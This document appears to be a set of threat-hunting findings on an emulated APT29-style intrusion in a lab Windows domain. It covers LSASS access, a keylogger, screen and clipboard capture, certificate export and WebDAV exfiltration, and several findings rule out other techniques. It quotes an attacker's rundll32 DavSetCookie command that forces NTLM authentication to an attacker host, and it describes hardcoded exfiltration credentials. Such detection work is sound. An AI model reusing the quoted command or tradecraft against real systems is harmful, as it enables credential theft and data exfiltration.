title: LSASS memory accessed with PROCESS_ALL_ACCESS by hidden PowerShell loader on scranton
summary: On scranton.dmevals.local, a PowerShell process (PID 2976, user DMEVALS\pbeesly, IntegrityLevel High) was spawned by control.exe with a hidden window and execution-policy bypass, decoding a steganographic payload from C:\Users\pbeesly\Downloads\monkey.png and IEX-ing it. Seconds later the same PowerShell process opened a handle to lsass.exe (PID 736) with GrantedAccess 0x1FFFFF (PROCESS_ALL_ACCESS) and 0x1F3FFF, the access mask used to read LSASS memory for credential dumping. Windows Security 4663 confirms powershell.exe accessing \Device\HarddiskVolume2\Windows\System32\lsass.exe as pbeesly at the same time. A second host, nashua.dmevals.local, shows wsmprovhost.exe (PowerShell Remoting) opening lsass.exe with 0x1F3FFF with a call trace through Microsoft.PowerShell.Commands.Management, consistent with a PowerShell-based LSASS dump.

title: Credential-access tooling staged via PsExec and hidden PowerShell on compromised hosts
summary: The environment shows hands-on-keyboard credential-access tradecraft: PsExec64.exe and PSEXESVC.exe were executed on nashua.dmevals.local (PSEXESVC service installed repeatedly by user pbeesly), and a hidden PowerShell loader ran on scranton.dmevals.local. These are the staging mechanisms surrounding the LSASS access. No standalone credential-dumping binary (mimikatz/procdump/comsvcs) was observed on disk, so the dumping appears to be performed in-memory via PowerShell.

title: netsh packet capture on scranton.dmevals.local is Azure Network Watcher agent activity, not adversary sniffing
summary: The only packet-capture activity in the dataset is a single netsh trace capture on scranton.dmevals.local at 2020-05-02T03:19:17Z, run as NT AUTHORITY\SYSTEM by the Microsoft Azure NetworkWatcherAgent (C:\Packages\Plugins\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\1.4.1421.1\NetworkWatcherAgent\NetworkWatcherAgent.exe /service). It is part of a coherent Azure platform maintenance sequence on that host: the NetworkWatcherAgent service started at 03:19:13.877Z (parent services.exe), netsh 'trace start capture=yes' wrote an .etl to C:\windows\TEMP\E7116ECA-...\B91E06C5-....etl, netsh loaded the Windows capture helper hnetmon.dll, and netsh 'trace stop' ran at 03:19:24.835Z. In the same window the Azure guest agent (WaAppAgent.exe) drove logman trace create/start/stop cycles for GAEvents and RTEvents. No third-party sniffing tools (tcpdump/windump/wireshark/dumpcap/pktmon/rawcap) were observed, no pcap/npcap/winpcap driver loads were found, and no attacker-controlled process or user was involved. This is expected Azure Network Watcher diagnostic capture, not credential-access network sniffing.

title: PowerShell keylogger (Get-Keystrokes) executed on scranton by user pbeesly
summary: On 2020-05-02 between 03:06:47 and 03:07:36 UTC, on host scranton.dmevals.local, user pbeesly (DMEVALS\pbeesly, SID S-1-5-21-1830255721-3727074217-2423397540-1107) ran an interactive PowerShell session (PID 3852) that loaded an attacker toolkit from C:\Program Files\SysinternalsSuite\psversion.ps1. The toolkit defines a Keystroke-Check function that enumerates AV/EDR processes (avp, acs, outpost, mcvsescn, mcods, navapsvc, kav, AvastSvc, AvastUi, nod32krn, nod32, ekern, dwengine, MsMpEng, msseces, ekrn, savservice, scfservice, savadminservice) — classic keylogger anti-detection — and then invokes Get-Keystrokes, sleeping 15 seconds and reading the 'Keystrokes' job output. This is input capture (keylogging) on the compromised host.

title: PowerShell opens LSASS with PROCESS_ALL_ACCESS (0x1FFFFF) on scranton
summary: At 2020-05-02T03:05:16.654Z on scranton.dmevals.local, PowerShell.exe (PID 2976, running as SYSTEM, S-1-5-18) opened a handle to C:\windows\system32\lsass.exe (PID 736) with GrantedAccess 0x1FFFFF (PROCESS_ALL_ACCESS), preceded 31 ms earlier by a 0x1f3fff access. This is the same interactive attacker session (user pbeesly) that minutes later ran the keylogger and screen-capture toolkit; full-access LSASS handles are used for credential/input capture (e.g. dumping or hooking LSASS). The call trace shows ntdll/KERNELBASE with an UNKNOWN module, consistent with injected/reflective code rather than a normal signed consumer.

title: Screen capture and clipboard harvesting in the same attacker PowerShell session
summary: In the same scranton.dmevals.local session (user pbeesly, PID 3852) at 03:05:53 the toolkit defined Invoke-ScreenCapture, which loops taking screenshots of the virtual screen via System.Windows.Forms/System.Drawing into $env:USERPROFILE\Downloads, and at 03:06:42 the operator ran Get-Clipboard to harvest clipboard contents. These are GUI input/display capture actions consistent with collecting credentials and sensitive data from the interactive desktop. No fake credential dialog (CredUIPromptForCredentials) was observed, so this is GUI capture rather than a spoofed prompt.

Across windows.security, windows.sysmon, windows.powershell and windows.other (2020-05-02 02:55-03:28Z) there is no evidence of brute-force authentication. All failed-logon queries returned zero hits: event.code:4625 (Windows logon failure) and event.code:4771 (Kerberos pre-auth failure) matched nothing. The only NTLM credential-validation event (4776) on newyork.dmevals.local for user pbeesly carries win.Status 0x0, i.e. a SUCCESS, not a failure. No cracking tooling (hashcat/john/crack) was executed and no wordlist/potfile/hash files were created. The credential-related activity that IS present on scranton.dmevals.local is credential theft (LSASS access, PFX export), which belongs to a different technique family, not T1110.

title: WebDAV forced authentication via rundll32 davclnt.dll DavSetCookie on scranton.dmevals.local
summary: On scranton.dmevals.local, in the context of user DMEVALS\pbeesly, PowerShell created a StartUp shortcut (hostui.lnk) and downloaded OfficeSupplies.7z, then repeatedly executed 'rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav' (03:08:50 and 03:10:22-23). DavSetCookie is the canonical WebDAV forced-authentication primitive: it makes the WebClient service authenticate to an attacker-controlled WebDAV server, leaking the user's NTLM credentials. Zeek corroborates the coercion: host 10.0.1.4 issued WebDAV OPTIONS/PROPFIND requests to 192.168.0.4:80 with user-agent 'Microsoft-WebDAV-MiniRedir/10.0.18362', receiving 401 Unauthorized (NTLM challenge) responses, including a PROPFIND for /webdav/OfficeSupplies.7z. This is attacker-driven credential coercion, not normal system behaviour.

title: SMB/IPC$/SYSVOL access is normal machine-account domain activity
summary: The SMB share access and outbound SMB connections in the Windows datasets are all attributable to machine accounts (SYSTEM) performing routine domain/GPO operations: SYSVOL reads of dmevals.local Policies gpt.ini/GptTmpl.inf by NEWYORK$, SCRANTON$, NASHUA$, UTICA$; IPC$ samr access; and ADMIN$ access by pbeesly. Outbound 445 connections originate from System processes to domain hosts (10.0.0.4, 10.0.1.6, fe80::e40c:95b6:b0a7:6429). These are consistent with normal domain controller/GPO replication and management traffic, not forced-authentication coercion.

title: No exploitation-for-credential-access activity; LSASS access is benign Azure/system tooling
summary: Across all four Windows hosts (scranton/newyork/nashua/utica.dmevals.local) in the 2020-05-02 window, no exploitation of a software vulnerability for credential access was observed. The 326 Sysmon process-access (event.code 10) events targeting C:\windows\system32\lsass.exe are dominated by legitimate Azure guest agents and system processes: svchost.exe with GrantedAccess 0x1000, C:\Packages\Plugins\Microsoft.Azure.Security.IaaSAntimalware\1.5.5.9\AntimalwareConfig.exe and C:\WindowsAzure\Packages\Telemetry\WindowsAzureTelemetryService.exe with 0x1400, plus wininit.exe (0x1fffff) and services.exe (0x1000) at boot. No credential-dumping tooling (mimikatz/sekurlsa/procdump/comsvcs/MiniDump) appears in any process command line, and the only lsass.exe process execution is lsass itself. Kerberos events (14x 4768, 28x 4769) are all successful (Status 0x0) normal TGT/TGS requests for pbeesly and machine accounts. The concurrent PowerShell activity (pbeesly: Invoke-Discovery, Invoke-Persistence, Invoke-ScreenCapture, Invoke-Exfil, Invoke-SeaDukeStage -ComputerName NASHUA, PsExec to NASHUA) is post-exploitation/lateral movement, not vulnerability exploitation for credential access.

title: No browser session cookie theft observed; activity is WebDAV-based exfiltration
summary: Across windows.security, windows.sysmon, windows.powershell and windows.other (2020-05-02 02:55-03:28Z) there is no evidence of web session cookie theft. No process read or copied browser cookie stores (Cookies, Login Data, WebCache, session files): ES|QL searches over Sysmon file-create (event.code 11) and Security object-access (event.code 4663) for cookie/login/session/webcache paths returned only OS and browser-internal artifacts (e.g. Edge RecoveryStore/DataStore temp files created by MicrosoftEdge.exe itself, and svchost INetCookies). The only 'cookie' hits are rundll32.exe davclnt.dll,DavSetCookie calls by user pbeesly on scranton.dmevals.local, which are WebDAV client cookie operations for the mapped \\192.168.0.4\webdav share used by the Invoke-Exfil PowerShell script (hunt.source_id apt29-powershell) - not browser session theft. The observed intrusion is credential/exfil activity (7-Zip archive OfficeSupplies.7z, WebDAV upload), not T1539.

title: PowerShell Get-PrivateKeys exported all LocalMachine certificates to .pfx files
summary: On scranton.dmevals.local, user pbeesly ran a PowerShell script block (EventID 4104, script path C:\Program Files\SysinternalsSuite\readme.ps1) defining function Get-PrivateKeys. It builds a SecureString from the hardcoded password "saribas", enumerates cert:\LocalMachine recursively, and calls Export-PfxCertificate for every cert with a thumbprint, writing random-named .pfx files into $env:USERPROFILE\Downloads. Sysmon EventID 11 confirms the resulting file C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx was created by powershell.exe (PID 3876) at 2020-05-02T03:04:57Z. This is direct theft of private keys/certificates from the host.

title: PowerShell Invoke-Exfil script with embedded plaintext credentials and archive of Downloads
summary: On scranton.dmevals.local, user pbeesly ran a PowerShell script block (EventID 4104, path C:\Program Files\SysinternalsSuite\psversion.ps1) defining function Invoke-Exfil. It installs the 7Zip4Powershell module, compresses everything in $env:USERPROFILE\Downloads into a password-protected archive ($env:APPDATA\OfficeSupplies.7z, password "lolol"), and constructs a PSCredential from hardcoded plaintext username "cozy" and password "MyCozyPassw0rd!" to map a WebDAV share (\\192.168.0.4\webdav) and copy the archive out. The script itself stores credentials in a file, and it packages the previously exported private keys for exfiltration.
